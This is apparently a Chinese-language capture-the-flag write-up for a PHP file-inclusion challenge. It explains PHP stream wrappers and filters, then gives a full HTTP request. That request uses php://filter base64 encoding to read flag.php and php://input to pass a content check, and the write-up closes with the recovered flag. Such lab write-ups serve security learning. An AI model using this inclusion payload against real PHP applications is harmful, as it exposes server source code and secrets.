# FILECLUDE

> 首先可看到这是通过GET传递参数file1和参数file2进行包含文件并显示的,是文件包含绕过,使用伪协议+编码绕过即可

## 涉及函数

### include

> 从外部引入php文件并执行,如果执行不成功,就返回文件的源码

### file_get_contents

> 把整个文件读入一个字符串中,可结合php://input使用,如file_get_contents('php://input'),请求方法为post,可获取数据


## PHP文件包含漏洞常用伪协议

```
file:// 访问本地文件系统
http:// 访问http(s）网址
ftp:// 访问ftp
php:// 访问各个输入/输出流
zlib:// 压缩流
data:// 数据
rar:// RAR压缩包
ogg:// 音频流
```

## filters类型

> String Filters: string.rot13、string.toupper、string.tolower、string.strip_tags

> Conversion Filters: convert.base64-encode & convert.base64-decode、convert.quoted-printable-encode & convert.quoted-printable-decode、convert.iconv.*

> Compression Filters: zlib.deflate、zlib.inflate、bzip2.compress和bzip2.decompress

> Encryption Filters: mcrypt.*和 mdecrypt.*

> [官方文档]https://www.php.net/manual/zh/filters.php

> [使用参考](https://blog.csdn.net/qq_44657899/article/details/109300335)

## filters支持编码

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
...
```

> [官方文档](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

## 思路分析

> 通过代码可以分析得到,这是考察文件名绕过的.使用伪协议绕过,读取到的file2内容得是hello ctf才能继续,这是就可以采用php://input结合的方式来绕过.

> file1参数被include函数使用,直接输入flag.php无效,需要使用伪协议绕过,可使用php://filter伪协议来读取源代码并被include加载出得到flag.php内容.php://filter/read=convert.base64-encode/resource=flag.php,得到的结果为base64编码,再base64解码即可.

## payload

```
POST /?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input HTTP/1.1
Host: 61.147.171.105:55317
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 9

hello ctf
```

## flag

> cyberpeace{a519a2987bf74cc4061607125c9266bc}